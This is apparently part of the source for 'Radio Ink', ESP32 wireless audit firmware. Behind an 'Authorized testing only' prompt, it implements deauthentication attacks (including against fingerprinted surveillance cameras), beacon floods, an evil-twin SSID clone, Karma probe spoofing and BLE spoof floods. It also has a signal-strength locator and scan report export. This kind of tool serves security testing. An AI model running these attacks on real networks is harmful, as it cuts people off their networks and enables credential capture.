  UITheme::getInstance().suppressBrandLogoOnce();  // menu view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
bool RadioAuditActivity::requireAuthorization() {
  if (g_activeAuthorized) return true;
  auto handler = [this](const ActivityResult& res) {
    if (!res.isCancelled) g_activeAuthorized = true;  // confirmed for the rest of the session
    requestUpdate();
  };
  startActivityForResult(std::make_unique<ConfirmationActivity>(renderer, mappedInput,
                                                                std::string("Authorized testing only"),
                                                                std::string("Transmit attack frames?")),
                         handler);
  return false;  // caller aborts; user repeats the action once authorized
}

void RadioAuditActivity::handshakeDeauthTarget() {
  if (!requireAuthorization()) return;
  HsSsidEntry* ap = hsBestAp();
  if (!ap) {
    status = "No AP yet - wait for a beacon";
    requestUpdate();
    return;
  }
  // Lock to the target's channel and dwell so the forced reconnect is captured.
  captureChannel = ap->channel ? ap->channel : captureChannel;
  captureChannelLocked = true;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
  attackFrames += sendDeauthBurst(ap->bssid, BROADCAST_MAC, 16);
  status = std::string("Deauth ") + ap->ssid + " CH" + std::to_string(captureChannel) + " (" +
           std::to_string(attackFrames) + " tx)";
  requestUpdate();
}

void RadioAuditActivity::beginDeauth(std::vector<int> targets, const std::string& label) {
  if (!requireAuthorization()) return;  // aborts if not yet confirmed; detail view stays put
  if (targets.empty()) {
    status = "No targets - scan and mark APs first";
    state = State::DONE;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  prepWifiSta();
  attackMode = AttackMode::Deauth;
  attackTargets = std::move(targets);
  attackScopeLabel = label;
  attackFrames = 0;
  attackTargetIdx = 0;
  attackLastMs = 0;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  state = State::ATTACKING;
  status = std::string("Deauth: ") + label + " (" + std::to_string(attackTargets.size()) + " AP)";
  requestUpdate();
}

void RadioAuditActivity::startDeauthAttack() {
  std::vector<int> all;
  all.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++) all.push_back(i);
  beginDeauth(std::move(all), "all APs");
}

void RadioAuditActivity::startDeauthSelected() {
  std::vector<int> sel;
  sel.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++)
    if (wifiFindings[i].marked) sel.push_back(i);
  beginDeauth(std::move(sel), "selected");
}

void RadioAuditActivity::startDeauthCameras() {
  // Target only WiFi APs fingerprinted as cameras. Uses the strong signals --
  // SSID fingerprint (incl. Flock) and dedicated camera/Flock MAC OUIs -- and
  // intentionally NOT the broad vendor heuristic, so we don't knock generic
  // Amazon/Google gear off the air.
  std::vector<int> cams;
  cams.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++) {
    const auto& w = wifiFindings[i];
    const std::string vendor = macVendor(w.bssid);
    if (!cameraFingerprintReason(w.ssid, vendor).empty() || !cameraMacReason(w.bssid).empty())
      cams.push_back(i);
  }
  if (cams.empty()) {
    status = "No cameras found - run a WiFi/Camera scan first";
    state = State::DONE;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  beginDeauth(std::move(cams), "cameras");
}

void RadioAuditActivity::startBeaconFlood() {
  if (!requireAuthorization()) return;
  prepWifiSta();
  attackMode = AttackMode::Beacon;
  attackFrames = 0;
  attackLastMs = 0;
  captureChannel = 1;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "Beacon flood";
  requestUpdate();
}

void RadioAuditActivity::startEvilTwin() {
  if (!requireAuthorization()) return;
  // Clone an SSID: prefer a single marked AP, else the strongest named AP, else
  // a generic open name. EvilTwinActivity owns the AP/DNS/portal lifecycle.
  std::string ssid;
  for (const auto& w : wifiFindings)
    if (w.marked && !w.ssid.empty()) {
      ssid = w.ssid;
      break;
    }
  if (ssid.empty())
    for (const auto& w : wifiFindings)
      if (!w.ssid.empty()) {
        ssid = w.ssid;  // wifiFindings is sorted by RSSI, so this is the strongest
        break;
      }
  if (ssid.empty()) ssid = "Free WiFi";

  startActivityForResult(std::make_unique<EvilTwinActivity>(renderer, mappedInput, ssid),
                         [this](const ActivityResult&) { requestUpdate(); });
}

void RadioAuditActivity::startBleSpoof() {
  if (!requireAuthorization()) return;
#if defined(RADIO_AUDIT_ENABLE_BLE)
  shutdownBleController();
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);
  if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_START) {
    status = "BLE spoof: low memory";
    state = State::DONE;
    requestUpdate();
    return;
  }
  if (!bleReady) {
    BLEDevice::init("RadioInk");
    bleReady = true;
  }
  attackMode = AttackMode::BleSpoof;
  attackFrames = 0;
  attackLastMs = 0;
  attackStatusLine = "advertising...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "BLE spoof flood";
  requestUpdate();
#else
  status = "BLE disabled in this build";
  state = State::DONE;
  requestUpdate();
#endif
}

void RadioAuditActivity::startKarma() {
  if (!requireAuthorization()) return;
  prepWifiSta();

  g_karma = makeUniqueNoThrow<KarmaState>();  // zero-initialized on the heap
  if (!g_karma) {
    LOG_ERR("RADIO", "Karma: OOM");
    status = "Karma: out of memory";
    state = State::DONE;
    requestUpdate();
    return;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&karmaProbeCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_karma->active = true;
  attackMode = AttackMode::Karma;
  attackFrames = 0;
  attackLastMs = 0;
  attackStatusLine = "harvesting probes...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "Karma / probe response";
  requestUpdate();
}

void RadioAuditActivity::startCameraDeauth() {
  if (!requireAuthorization()) return;  // aborts if not yet confirmed
  prepWifiSta();
  attackMode = AttackMode::CameraDeauth;
  attackFrames = 0;
  attackTargetIdx = 0;
  attackLastMs = 0;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  captureChannel = (targetCamChannel >= 1 && targetCamChannel <= 13) ? static_cast<uint8_t>(targetCamChannel) : 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
  showingTarget = false;
  showingCameraList = false;
  showingDetails = false;
  state = State::ATTACKING;
  status = std::string("Deauth ") + (targetCamHasAp ? "camera " : "AP ") + macToString(targetCamMac);
  requestUpdate();
}

void RadioAuditActivity::stopAttack() {
#if defined(RADIO_AUDIT_ENABLE_BLE)
  if (attackMode == AttackMode::BleSpoof) {
    BLEDevice::getAdvertising()->stop();
    shutdownBleController();
  }
#endif
  if (attackMode == AttackMode::Karma) {
    if (g_karma) g_karma->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_karma.reset();  // free the PNL table back to the heap
  }
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);
  state = State::DONE;
  status = std::string("Attack stopped, ") + std::to_string(attackFrames) + " frames sent";
  requestUpdate();
}

void RadioAuditActivity::renderAttack() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  const char* title = attackMode == AttackMode::Deauth       ? "Deauth Attack"
                      : attackMode == AttackMode::Beacon       ? "Beacon Flood"
                      : attackMode == AttackMode::Karma        ? "Karma / Probe Resp"
                      : attackMode == AttackMode::CameraDeauth ? "Deauth Camera"
                                                               : "BLE Spoof";
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, title, status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Frames sent: ") + attackFrames).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  if (attackMode == AttackMode::Deauth) {
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      (String("Scope: ") + attackScopeLabel.c_str() + "  (" +
                       String(static_cast<unsigned>(attackTargets.size())) + " APs)")
                          .c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  } else if (attackMode == AttackMode::Karma) {
    const int pnl = g_karma ? g_karma->count : 0;
    const unsigned reqs = g_karma ? g_karma->probeReqs : 0;
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      (String("PNL: ") + pnl + " SSIDs   Probes: " + reqs).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    renderer.truncatedText(UI_12_FONT_ID, (String("Target: ") + attackStatusLine.c_str()).c_str(),
                                           pageWidth - summaryX * 2)
                        .c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  const char* blurb = attackMode == AttackMode::Deauth       ? "Kicking all clients off targeted APs."
                      : attackMode == AttackMode::Beacon       ? "Spamming fake beacons across channels."
                      : attackMode == AttackMode::Karma        ? "Beaconing the SSIDs clients probe for."
                      : attackMode == AttackMode::CameraDeauth ? "Knocking the camera off its network."
                                                               : "Flooding phantom BLE advertisers.";
  renderer.drawText(SMALL_FONT_ID, summaryX, y, blurb);

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
#endif  // RADIO_AUDIT_ENABLE_ACTIVE


void RadioAuditActivity::showChannelUsage() {
  if (wifiFindings.empty()) {
    status = "Run a WiFi scan first";
    requestUpdate();
    return;
  }
  int counts[15] = {};
  int strongest[15];
  for (int i = 0; i < 15; i++) strongest[i] = -127;
  for (const auto& w : wifiFindings) {
    if (w.channel >= 1 && w.channel <= 14) {
      counts[w.channel]++;
      if (w.rssi > strongest[w.channel]) strongest[w.channel] = w.rssi;
    }
  }
  int maxCount = 1;
  for (int ch = 1; ch <= 14; ch++)
    if (counts[ch] > maxCount) maxCount = counts[ch];

  targetTitle = "Channel Usage";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  for (int ch = 1; ch <= 14; ch++) {
    if (counts[ch] == 0) continue;
    int bars = counts[ch] * 12 / maxCount;
    if (bars < 1) bars = 1;
    char head[8];
    snprintf(head, sizeof(head), "CH%-2d ", ch);
    targetLines.push_back(std::string(head) + std::string(bars, '#') + " " + std::to_string(counts[ch]) + " (" +
                          std::to_string(strongest[ch]) + "dBm)");
  }
  status = "Channel usage";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::loadWatchlist() {
  watchlist.clear();
  if (!Storage.exists(WATCHLIST_PATH)) return;
  const String content = Storage.readFile(WATCHLIST_PATH);
  int start = 0;
  while (start < static_cast<int>(content.length())) {
    int nl = content.indexOf('\n', start);
    if (nl < 0) nl = content.length();
    String line = content.substring(start, nl);
    line.trim();
    line.toUpperCase();
    if (line.length() && line[0] != '#') watchlist.push_back(std::string(line.c_str()));
    start = nl + 1;
  }
}

void RadioAuditActivity::diffAndSaveSnapshot() {
  // Current device keys + human labels.
  std::vector<std::pair<std::string, std::string>> current;
  for (const auto& w : wifiFindings)
    current.emplace_back("W|" + upperStr(w.bssid), w.ssid.empty() ? w.bssid : w.ssid);
  for (const auto& b : bleFindings)
    current.emplace_back("B|" + upperStr(b.address), b.name.empty() ? b.address : b.name);

  std::vector<std::pair<std::string, std::string>> previous;
  const bool hadPrevious = Storage.exists(SNAPSHOT_PATH);
  if (hadPrevious) {
    const String content = Storage.readFile(SNAPSHOT_PATH);
    int start = 0;
    while (start < static_cast<int>(content.length())) {
      int nl = content.indexOf('\n', start);
      if (nl < 0) nl = content.length();
      const String line = content.substring(start, nl);
      const int tab = line.indexOf('\t');
      if (tab > 0) previous.emplace_back(line.substring(0, tab).c_str(), line.substring(tab + 1).c_str());
      start = nl + 1;
    }
  }

  auto contains = [](const std::vector<std::pair<std::string, std::string>>& v, const std::string& key) {
    for (const auto& e : v)
      if (e.first == key) return true;
    return false;
  };

  if (hadPrevious) {
    for (const auto& cur : current)
      if (!contains(previous, cur.first)) addAuditFinding("INFO", "New since last scan", cur.second + " appeared.");
    for (const auto& prev : previous)
      if (!contains(current, prev.first)) addAuditFinding("INFO", "Gone since last scan", prev.second + " disappeared.");
  }

  String out;
  for (const auto& cur : current) out += String(cur.first.c_str()) + "\t" + cur.second.c_str() + "\n";
  Storage.writeFile(SNAPSHOT_PATH, out);
}

void RadioAuditActivity::startLocator() {
  if (!targetLocatable) return;
  locating = true;
  showingTarget = false;
  locBestRssi = -127;
  locCurRssi = -127;
  locPrevRssi = -127;
  locHasSignal = false;
  locLastSampleMs = 0;

  if (!targetLocBle) {
    shutdownBleController();
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_STA);
    delay(100);
    memset(&g_targetCap, 0, sizeof(g_targetCap));
    memcpy(g_targetCap.bssid, targetLocBssid, 6);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&targetPromiscuousCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(static_cast<uint8_t>(targetLocChannel), WIFI_SECOND_CHAN_NONE);
    g_targetCap.active = true;
  } else {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    delay(200);
    if (!bleReady) {
      BLEDevice::init("RadioInk");
      bleScan = BLEDevice::getScan();
      bleReady = true;
    }
    if (!bleScan) {  // controller init failed - don't enter the locator
      locating = false;
      status = "BLE init failed";
      showingTarget = true;
      requestUpdate();
      return;
    }
    bleScan->setActiveScan(false);
    bleScan->setInterval(320);
    bleScan->setWindow(80);
#endif
  }
  status = "Locating...";
  requestUpdate();
}

void RadioAuditActivity::stopLocator() {
  locating = false;
  if (!targetLocBle) {
    g_targetCap.active = false;
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    delay(50);
  } else {
    shutdownBleController();
  }
}

void RadioAuditActivity::locatorSample() {
  if (!targetLocBle) {
    if (g_targetCap.rssiSamples > 0) {
      locCurRssi = static_cast<int>(g_targetCap.rssiSum / static_cast<long>(g_targetCap.rssiSamples));
      locHasSignal = true;
    } else {
      locHasSignal = false;
    }
    g_targetCap.rssiSum = 0;
    g_targetCap.rssiSamples = 0;
  } else {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    BLEScanResults* results = bleScan->start(1, false);
    const int count = results ? results->getCount() : 0;
    bool seen = false;
    for (int i = 0; i < count; i++) {
      BLEAdvertisedDevice device = results->getDevice(i);
      if (std::string(device.getAddress().toString().c_str()) == targetLocAddr) {
        locCurRssi = device.getRSSI();
        seen = true;
        break;
      }
    }
    bleScan->clearResults();
    locHasSignal = seen;
#endif
  }
  if (locHasSignal && locCurRssi > locBestRssi) locBestRssi = locCurRssi;
}

void RadioAuditActivity::renderLocator() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                 ("Locate: " + targetLocName).c_str(), status.c_str());

  int y = contentTop;
  if (!locHasSignal) {
    renderer.drawText(UI_12_FONT_ID, summaryX, y, "-- no signal --", true, EpdFontFamily::BOLD);
  } else {
    // Map RSSI [-100..-30] -> 0..30 bar segments.
    int level = (locCurRssi + 100) * 30 / 70;
    if (level < 0) level = 0;
    if (level > 30) level = 30;
    renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("RSSI: ") + locCurRssi + " dBm").c_str(), true,
                      EpdFontFamily::BOLD);
    y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
    const std::string bar = "[" + std::string(level, '#') + std::string(30 - level, '.') + "]";
    renderer.drawText(UI_12_FONT_ID, summaryX, y, bar.c_str(), true, EpdFontFamily::BOLD);
    y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
    renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Best (closest): ") + locBestRssi + " dBm").c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 8;
    const char* trend = "= holding";
    if (locPrevRssi > -127) {
      if (locCurRssi - locPrevRssi >= 2) trend = "^^ WARMER (closer)";
      else if (locPrevRssi - locCurRssi >= 2) trend = "vv colder (farther)";
    }
    renderer.drawText(UI_12_FONT_ID, summaryX, y, trend, true, EpdFontFamily::BOLD);
  }

  const auto labels = mappedInput.mapLabels("Back", "Back", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

String RadioAuditActivity::makeTextReport() const {
  String out;
  out += "RADIO INK REPORT\n";
  out += "================\n";
  out += "Time: ";
  out += (scanTime.empty() ? "n/a" : scanTime.c_str());
  out += "\nMode: ";
  out += scanModeName();
  out += "\nPasses: ";
  out += scanTotalPasses;
  out += "\n";
  out += makeRiskSummary();
  out += "\n";
  out += "WiFi APs: ";
  out += wifiFindings.size();
  out += "\nBLE dev: ";
  out += bleFindings.size();
  out += "\nProbes: ";
  out += probeFindings.size();
  out += "\nFindings: ";
  out += auditFindings.size();
  out += "\n\nAUDIT FINDINGS\n--------------\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += String(i + 1) + ". [" + f.severity.c_str() + "] " + f.title.c_str() + "\n";
    out += String("   ") + f.detail.c_str() + "\n";
  }
  out += "\nWIFI\n----\n";
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += String(i + 1) + ". " + (w.ssid.empty() ? "<hidden>" : w.ssid.c_str()) + "\n";
    out += String("   ") + w.bssid.c_str() + " CH" + w.channel + " seen " + w.seenCount + "/" + scanTotalPasses +
           "\n";
    out += String("   avg ") + w.rssi + " dBm min " + w.rssiMin + " max " + w.rssiMax + " " + w.auth.c_str() +
           "\n";
  }
  out += "\nBLE\n---\n";
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += String(i + 1) + ". " + b.address.c_str() + "\n";
    out += String("   ") + (b.name.empty() ? "<unnamed>" : b.name.c_str()) + "\n";
    out += String("   avg ") + b.rssi + " dBm min " + b.rssiMin + " max " + b.rssiMax + " seen " + b.seenCount +
           "/" + scanTotalPasses;
    if (b.hasTxPower) out += String(" TX ") + b.txPower;
    out += "\n";
  }
  out += "\nPROBES\n------\n";
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    const std::string vendor = macVendor(p.client);
    out += String(i + 1) + ". " + p.client.c_str();
    if (!vendor.empty()) out += String(" ") + vendor.c_str();
    out += "\n";
    out += String("   SSID ") + probeSsidLabel(p.ssid).c_str() + " RSSI " + p.rssi + " dBm\n";
  }
  return out;
}

String RadioAuditActivity::makeCsvReport() const {
  String out =
      "type,index,severity,title,detail,ssid,bssid,address,rssi,rssi_min,rssi_max,seen_count,pass_count,channel,auth,"
      "name,tx_power,manufacturer,vendor\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += String("finding,") + (i + 1) + "," + csvEscape(f.severity) + "," + csvEscape(f.title) + "," +
           csvEscape(f.detail) + ",,,,,,,,,,,,,,\n";
  }
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += String("wifi,") + (i + 1) + ",,,," + csvEscape(w.ssid) + "," + csvEscape(w.bssid) + ",,";
    out += String(w.rssi) + "," + w.rssiMin + "," + w.rssiMax + "," + w.seenCount + "," + scanTotalPasses + ",";
    out += String(w.channel) + "," + csvEscape(w.auth) + ",,,," + csvEscape(macVendor(w.bssid)) + "\n";
  }
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += String("ble,") + (i + 1) + ",,,,,,," + csvEscape(b.address) + ",";
    out += String(b.rssi) + "," + b.rssiMin + "," + b.rssiMax + "," + b.seenCount + "," + scanTotalPasses + ",,,";
    out += csvEscape(b.name) + ",";
    out += (b.hasTxPower ? String(b.txPower) : String("")) + "," + csvEscape(b.manufacturerHex) + "," +
           csvEscape(macVendor(b.address)) + "\n";
  }
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    out += String("probe,") + (i + 1) + ",,,," + csvEscape(p.ssid) + ",," + csvEscape(p.client) + ",";
    out += String(p.rssi) + ",,,,," + ",,,," + csvEscape(macVendor(p.client)) + "\n";
  }
  return out;
}

String RadioAuditActivity::makeJsonReport() const {
  String out;
  out += "{\n";
  out += "  \"tool\": \"Radio Ink\",\n";
  out += "  \"scan_time\": ";
  out += jsonEscape(scanTime.empty() ? "n/a" : scanTime.c_str());
  out += ",\n";
  out += "  \"scan_mode\": ";
  out += jsonEscape(scanModeName().c_str());
  out += ",\n";
  out += "  \"scan_passes\": ";
  out += scanTotalPasses;
  out += ",\n";
  out += "  \"uptime_seconds\": ";
  out += millis() / 1000;
  out += ",\n";
  out += "  \"summary\": {\n";
  out += "    \"wifi_count\": ";
  out += wifiFindings.size();
  out += ",\n";
  out += "    \"ble_count\": ";
  out += bleFindings.size();
  out += ",\n";
  out += "    \"probe_count\": ";
  out += probeFindings.size();
  out += ",\n";
  out += "    \"findings_count\": ";
  out += auditFindings.size();
  out += ",\n";
  out += "    \"risk\": ";
  out += jsonEscape(makeRiskSummary().c_str());
  out += "\n";
  out += "  },\n";
  out += "  \"findings\": [\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"severity\": ";
    out += jsonEscape(f.severity);
    out += ", \"title\": ";
    out += jsonEscape(f.title);
    out += ", \"detail\": ";
    out += jsonEscape(f.detail);
    out += "}";
    if (i + 1 < auditFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"wifi\": [\n";
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"ssid\": ";
    out += jsonEscape(w.ssid);
    out += ", \"bssid\": ";
    out += jsonEscape(w.bssid);
    out += ", \"rssi\": ";
    out += w.rssi;
    out += ", \"rssi_min\": ";
    out += w.rssiMin;
    out += ", \"rssi_max\": ";
    out += w.rssiMax;
    out += ", \"seen_count\": ";
    out += w.seenCount;
    out += ", \"channel\": ";
    out += w.channel;
    out += ", \"auth\": ";
    out += jsonEscape(w.auth);
    out += ", \"hidden\": ";
    out += w.hidden ? "true" : "false";
    out += "}";
    if (i + 1 < wifiFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"ble\": [\n";
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"address\": ";
    out += jsonEscape(b.address);
    out += ", \"name\": ";
    out += jsonEscape(b.name);
    out += ", \"rssi\": ";
    out += b.rssi;
    out += ", \"rssi_min\": ";
    out += b.rssiMin;
    out += ", \"rssi_max\": ";
    out += b.rssiMax;
    out += ", \"seen_count\": ";
    out += b.seenCount;
    out += ", \"tx_power\": ";
    if (b.hasTxPower) {
      out += b.txPower;
    } else {
      out += "null";
    }
    out += ", \"manufacturer\": ";
    out += jsonEscape(b.manufacturerHex);
    out += "}";
    if (i + 1 < bleFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"probes\": [\n";
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"client\": ";
    out += jsonEscape(p.client);
    out += ", \"ssid\": ";
    out += jsonEscape(p.ssid);
    out += ", \"ssid_label\": ";
    out += jsonEscape(probeSsidLabel(p.ssid));
    out += ", \"rssi\": ";
    out += p.rssi;
    out += ", \"vendor\": ";
    out += jsonEscape(macVendor(p.client));
    out += "}";
    if (i + 1 < probeFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ]\n";
  out += "}\n";
  return out;
}

String RadioAuditActivity::makeWigleReport() const {
  // Optional manual location ("lat,lon" in location.txt). No GPS on the X4, so
  // without it every row is 0,0 -- a valid-format survey log, not WiGLE-uploadable.
  String lat = "0", lon = "0";
  if (Storage.exists(LOCATION_PATH)) {
    String loc = Storage.readFile(LOCATION_PATH);
    loc.trim();
    const int comma = loc.indexOf(',');
    if (comma > 0) {
      lat = loc.substring(0, comma);
      lon = loc.substring(comma + 1);
      lat.trim();
      lon.trim();
    }
  }

  const String when = wigleTimestamp().c_str();
  String out =
      "WigleWifi-1.4,appRelease=1.0.0,model=Xteink X4,release=1.0.0,device=Radio Ink,display=eink,board=esp32c3,"
      "brand=Radio Ink\n";
  out += "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,"
         "AccuracyMeters,Type\n";

  for (const auto& w : wifiFindings) {
    out += String(w.bssid.c_str()) + "," + csvEscape(w.ssid) + "," + wigleAuth(w.auth).c_str() + "," + when + ",";
    out += String(w.channel) + "," + w.rssi + "," + lat + "," + lon + ",0,0,WIFI\n";
  }
  // BLE rows: WiGLE Type=BLE, MAC=address, SSID=device name, no channel/auth.
  for (const auto& b : bleFindings) {
    out += String(b.address.c_str()) + "," + csvEscape(b.name) + ",," + when + ",";
    out += String("0,") + b.rssi + "," + lat + "," + lon + ",0,0,BLE\n";
  }
  return out;
}

String RadioAuditActivity::makeRiskSummary() const {
  int openOrWep = 0;
  int weakWifi = 0;
  int hiddenWifi = 0;
  int closeBle = 0;
  int directedProbes = 0;
  int cameraHits = 0;

  for (const auto& w : wifiFindings) {
    if (w.auth == "OPEN" || w.auth == "WEP") openOrWep++;
    if (w.auth == "WEP" || w.auth == "WPA") weakWifi++;
    if (w.hidden) hiddenWifi++;
    const std::string label = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    if (!cameraFingerprintReason(label, macVendor(w.bssid)).empty()) cameraHits++;
  }

  for (const auto& b : bleFindings) {
    if (b.rssi >= -55) closeBle++;
    const std::string label = b.name.empty() ? b.address : b.name + " " + b.address;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    if (!cameraFingerprintReason(label + " " + advType, bleCompany(b.manufacturerHex)).empty()) cameraHits++;
  }
  for (const auto& p : probeFindings) {
    if (!p.ssid.empty()) directedProbes++;
  }

  if (wifiFindings.empty() && bleFindings.empty() && probeFindings.empty()) {
    return "Risk: no scan data yet\n";
  }

  String out = "Risk: ";
  out += openOrWep;
  out += " open/WEP, ";
  out += weakWifi;
  out += " weak WPA, ";
  out += hiddenWifi;
  out += " hidden, ";
  out += closeBle;
  out += " close BLE, ";
  out += directedProbes;
  out += " directed probes, ";
  out += cameraHits;
  out += " camera hits\n";
  return out;
}

String RadioAuditActivity::scanModeName() const { return deepScanMode ? "deep" : "quick"; }

std::string RadioAuditActivity::authName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA2/WPA3";
    default:
      return "UNKNOWN";
  }
}

String RadioAuditActivity::csvEscape(const std::string& value) {
  String out = "\"";
  for (char c : value) {
    if (c == '"') out += '"';
    out += c;
  }
  out += "\"";
  return out;
}

int RadioAuditActivity::averageRssi(int rssiSum, int seenCount) {
  if (seenCount <= 0) return 0;
  return rssiSum / seenCount;
}

String RadioAuditActivity::jsonEscape(const std::string& value) {
  String out = "\"";
  for (char c : value) {
    switch (c) {
      case '"':
        out += "\\\"";
        break;
      case '\\':
        out += "\\\\";
        break;
      case '\n':
        out += "\\n";
        break;
      case '\r':
        out += "\\r";
        break;
      case '\t':
        out += "\\t";
        break;
      default:
        if (static_cast<uint8_t>(c) < 0x20) {
          out += " ";
        } else {
          out += c;
        }
        break;
    }
  }
  out += "\"";
  return out;
}

void RadioAuditActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();

